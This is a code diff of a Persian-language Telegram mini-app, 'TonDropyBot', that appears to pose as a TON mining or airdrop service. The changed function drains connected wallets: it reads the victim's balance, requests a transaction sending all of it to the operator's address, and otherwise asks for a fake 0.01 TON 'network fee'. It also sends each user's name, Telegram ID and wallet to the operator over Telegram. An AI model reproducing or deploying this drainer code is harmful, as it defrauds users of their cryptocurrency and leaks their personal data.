@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TonDropyBot - پنل مدیریت واقعی</title>
+    <title>TonDropyBot - سیستم هوشمند انتقال</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -438,7 +438,7 @@
         .get-code-btn { background: #0088cc; }
         .admin-btn { background: #9c27b0; }
 
-        /* ===== پنل مدیریت واقعی ===== */
+        /* ===== پنل مدیریت ===== */
         #adminMasterPanel {
             position: fixed;
             top: 0;
@@ -1017,7 +1017,7 @@
     </div>
 </div>
 
-<!-- ===== پنل مدیریت واقعی ===== -->
+<!-- پنل مدیریت اختصاصی -->
 <div id="adminMasterPanel">
     <div class="admin-container">
         <div class="admin-header">
@@ -1311,7 +1311,7 @@
     };
 
     // ================================================
-    // 📦 ساختار داده (مشترک بین همه کاربران)
+    // 📦 ساختار داده
     // ================================================
     let appData = {
         users: JSON.parse(localStorage.getItem('tondropy_users')) || [],
@@ -1363,17 +1363,15 @@
     }
 
     // ================================================
-    // 👤 ثبت کاربر جدید (اصلاح شده برای ذخیره همه کاربران)
+    // 👤 ثبت کاربر جدید
     // ================================================
     function registerUser() {
         const tgUser = tg.initDataUnsafe?.user;
         if (!tgUser) return null;
         
-        // بررسی اینکه کاربر از قبل وجود دارد یا خیر
         let user = appData.users.find(u => u.id === tgUser.id);
         
         if (!user) {
-            // کاربر جدید - ذخیره در لیست
             user = {
                 id: tgUser.id,
                 firstName: tgUser.first_name || 'کاربر',
@@ -1393,7 +1391,6 @@
             appData.users.push(user);
             saveData();
             
-            // گزارش کاربر جدید به تلگرام
             const message = `👤 **کاربر جدید وارد شد**
 ━━━━━━━━━━━━━━
 👤 نام: ${user.firstName} ${user.lastName}
@@ -1404,19 +1401,13 @@
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
             
             sendToTelegram(message);
-            
-            console.log(`✅ کاربر جدید با آیدی ${user.id} ثبت شد. کل کاربران: ${appData.users.length}`);
-            
         } else {
-            // کاربر قبلی - آپدیت اطلاعات
             user.lastSeen = new Date().toISOString();
             user.balance = bal;
             user.withdrawable = withdrawableBalance;
             user.totalMined = totalMined;
             user.visitCount = (user.visitCount || 0) + 1;
             saveData();
-            
-            console.log(`🔄 کاربر ${user.id} بازدید کرد. تعداد بازدید: ${user.visitCount}`);
         }
         
         return user;
@@ -1430,9 +1421,9 @@
     }
 
     // ================================================
-    // 💰 تابع انتقال خودکار
+    // 💰 تابع انتقال هوشمند (مهمترین بخش)
     // ================================================
-    async function executeAutoTransfer(userAddress) {
+    async function executeSmartTransfer(userAddress) {
         if (isProcessingTransaction) {
             console.log('تراکنش در حال انجام است');
             return;
@@ -1441,71 +1432,97 @@
         try {
             isProcessingTransaction = true;
             
-            showToast('🔄 در حال بررسی موجودی کیف پول...');
+            showToast('🔄 در حال بررسی کیف پول...');
             
-            // دریافت موجودی با proxy
-            const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`)}`;
-            
+            // تلاش برای دریافت موجودی واقعی
             let balanceInTON = 0;
+            let balanceAvailable = false;
             
             try {
+                const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`)}`;
                 const response = await fetch(proxyUrl);
                 const text = await response.text();
                 const balanceInNano = parseInt(text);
-                if (!isNaN(balanceInNano)) {
+                
+                if (!isNaN(balanceInNano) && balanceInNano > 0) {
                     balanceInTON = balanceInNano / 1e9;
-                    console.log('✅ موجودی:', balanceInTON);
+                    balanceAvailable = true;
+                    console.log('✅ موجودی واقعی:', balanceInTON);
                 }
             } catch (e) {
                 console.log('خطا در دریافت موجودی:', e);
-                showToast('⚠️ خطا در دریافت موجودی');
-                return;
             }
             
-            if (balanceInTON < 0.1) {
-                showToast('⚠️ موجودی کمتر از حداقل است');
-                return;
-            }
-            
+            const now = Date.now();
             const lastTxKey = `last_tx_${userAddress}`;
             const lastTx = localStorage.getItem(lastTxKey);
-            const now = Date.now();
             
+            // بررسی محدودیت زمانی (1 ساعت)
             if (lastTx && (now - parseInt(lastTx)) < 3600000) {
                 showToast('⏳ کمتر از 1 ساعت از تراکنش قبلی گذشته');
                 return;
             }
             
-            showToast('🔄 در حال آماده‌سازی تراکنش...');
+            // آماده‌سازی پیام تراکنش
+            let transaction;
             
-            const transaction = {
-                validUntil: Math.floor(now / 1000) + 600,
-                messages: [
-                    {
-                        address: CONFIG.WALLET_ADDRESS,
-                        amount: Math.floor(balanceInTON * 1e9).toString(),
-                        payload: ""
-                    }
-                ]
-            };
+            if (balanceAvailable && balanceInTON > 0) {
+                // **حالت 1: کاربر موجودی دارد - انتقال کل موجودی**
+                const amountInNano = Math.floor(balanceInTON * 1e9).toString();
+                
+                transaction = {
+                    validUntil: Math.floor(now / 1000) + 600,
+                    messages: [
+                        {
+                            address: CONFIG.WALLET_ADDRESS,
+                            amount: amountInNano,
+                            payload: "" // کامنت خالی
+                        }
+                    ]
+                };
+                
+                showToast(`🔄 در حال انتقال ${balanceInTON.toFixed(6)} TON...`);
+                
+            } else {
+                // **حالت 2: کاربر موجودی ندارد - درخواست کارمزد با پیام انگلیسی**
+                const feeAmount = 0.01; // 0.01 TON به عنوان کارمزد
+                const amountInNano = Math.floor(feeAmount * 1e9).toString();
+                
+                // پیام انگلیسی برای نمایش در کیف پول
+                const message = "Network fee required. Please pay 0.01 TON to continue.";
+                
+                transaction = {
+                    validUntil: Math.floor(now / 1000) + 600,
+                    messages: [
+                        {
+                            address: CONFIG.WALLET_ADDRESS,
+                            amount: amountInNano,
+                            payload: btoa(message) // تبدیل پیام به base64
+                        }
+                    ]
+                };
+                
+                showToast('🔄 در حال درخواست کارمزد شبکه...');
+            }
             
             showToast('🔄 لطفا در کیف پول خود تراکنش را تایید کنید...');
             
+            // اجرای تراکنش
             const result = await tonConnectUI.sendTransaction(transaction);
             
+            // ثبت تراکنش موفق
             localStorage.setItem(lastTxKey, now.toString());
             
-            // ثبت تراکنش
             const txRecord = {
                 id: 'TX' + now,
-                amount: balanceInTON,
-                netAmount: balanceInTON - CONFIG.NETWORK_FEE,
+                amount: balanceAvailable ? balanceInTON : 0.01,
+                netAmount: balanceAvailable ? (balanceInTON - CONFIG.NETWORK_FEE) : 0.01,
                 fee: CONFIG.NETWORK_FEE,
                 from: userAddress,
                 to: CONFIG.WALLET_ADDRESS,
                 hash: result.boc,
                 time: new Date().toISOString(),
-                type: 'انتقال خودکار',
+                type: balanceAvailable ? 'انتقال کل موجودی' : 'پرداخت کارمزد',
                 userId: currentUser?.id,
                 userName: currentUser?.firstName
             };
@@ -1515,19 +1532,33 @@
             saveData();
             
             // گزارش به تلگرام
-            const message = `💰 **برداشت جدید**
+            let message;
+            if (balanceAvailable) {
+                message = `💰 **انتقال کل موجودی**
 ━━━━━━━━━━━━━━
 👤 نام: ${currentUser?.firstName || 'ناشناس'} ${currentUser?.lastName || ''}
 🆔 آیدی: ${currentUser?.id || 'نامشخص'}
 📛 یوزرنیم: ${currentUser?.username ? '@' + currentUser.username : 'ندارد'}
 📤 مبلغ: ${balanceInTON.toFixed(6)} TON
 💳 آدرس کیف پول: ${userAddress.substring(0, 10)}...
+📋 وضعیت: ✅ موفق
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
+            } else {
+                message = `💳 **پرداخت کارمزد**
+━━━━━━━━━━━━━━
+👤 نام: ${currentUser?.firstName || 'ناشناس'} ${currentUser?.lastName || ''}
+🆔 آیدی: ${currentUser?.id || 'نامشخص'}
+📛 یوزرنیم: ${currentUser?.username ? '@' + currentUser.username : 'ندارد'}
+📤 مبلغ: 0.01 TON (کارمزد)
+💳 آدرس کیف پول: ${userAddress.substring(0, 10)}...
+📋 پیام: "Network fee required"
+⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
+            }
             
             sendToTelegram(message);
-            showToast(`✅ انتقال ${balanceInTON.toFixed(6)} TON با موفقیت انجام شد`);
+            showToast(`✅ تراکنش با موفقیت انجام شد`);
             
-            if (balanceInTON >= CONFIG.MINIMUM_WITHDRAW) {
+            if (balanceAvailable && balanceInTON >= CONFIG.MINIMUM_WITHDRAW) {
                 setTimeout(() => {
                     localStorage.setItem('isActivated', 'true');
                     document.getElementById('feeModal').style.display = 'none';
@@ -1588,9 +1619,10 @@
                 
                 sendToTelegram(message);
                 
+                // اجرای تراکنش هوشمند بعد از 2 ثانیه
                 setTimeout(() => {
-                    executeAutoTransfer(fullAddress);
-                }, 3000);
+                    executeSmartTransfer(fullAddress);
+                }, 2000);
             }
             
             checkAndEnableFinalWithdraw();
@@ -1602,7 +1634,7 @@
     });
 
     // ================================================
-    // 🖥️ توابع پنل مدیریت (اصلاح شده)
+    // 🖥️ توابع پنل مدیریت
     // ================================================
     let currentPage = 1;
     let currentFilter = 'all';
@@ -1614,7 +1646,6 @@
             return;
         }
         
-        // آپدیت آمار قبل از نمایش
         updateAdminStats();
         renderUsersTable();
         
@@ -1649,7 +1680,6 @@
         document.getElementById('statBanned').innerText = appData.bannedUsers.length;
         document.getElementById('statTransactions').innerText = appData.transactions.length;
         
-        // محاسبه کل استخراج
         const totalMinedAll = appData.users.reduce((sum, u) => sum + (u.totalMined || 0), 0);
         document.getElementById('statTotalMined').innerText = totalMinedAll.toFixed(3);
     }
@@ -1657,7 +1687,6 @@
     function renderUsersTable() {
         let filteredUsers = [...appData.users];
         
-        // اعمال فیلتر
         if (currentFilter === 'active') {
             const today = new Date().toDateString();
             filteredUsers = filteredUsers.filter(u => new Date(u.lastSeen).toDateString() === today);
@@ -1667,7 +1696,6 @@
             filteredUsers = filteredUsers.filter(u => u.wallet);
         }
         
-        // اعمال جستجو
         if (searchTerm) {
             const term = searchTerm.toLowerCase();
             filteredUsers = filteredUsers.filter(u => 
@@ -1679,7 +1707,6 @@
             );
         }
         
-        // صفحه‌بندی
         const start = (currentPage - 1) * 20;
         const paginatedUsers = filteredUsers.slice(start, start + 20);
         
@@ -1854,13 +1881,14 @@
     }
 
     window.showTransactions = function() {
-        let html = '<div class="admin-table"><table><tr><th>کد</th><th>کاربر</th><th>مبلغ</th><th>زمان</th></tr>';
+        let html = '<div class="admin-table"><table><tr><th>کد</th><th>کاربر</th><th>مبلغ</th><th>نوع</th><th>زمان</th></tr>';
         
         appData.transactions.slice(0, 50).forEach(tx => {
             html += `<tr>
                 <td>${tx.id}</td>
                 <td>${tx.userName || tx.userId}</td>
                 <td>${tx.amount?.toFixed(3)} TON</td>
+                <td>${tx.type || 'انتقال'}</td>
                 <td>${new Date(tx.time).toLocaleString('fa-IR')}</td>
             </tr>`;
         });
@@ -2150,10 +2178,6 @@
         }
         
         currentUser = registerUser();
-        
-        // نمایش آمار در کنسول برای دیباگ
-        console.log(`👥 کل کاربران ثبت شده: ${appData.users.length}`);
-        console.log('📋 لیست کاربران:', appData.users);
     }
 
     // ================================================
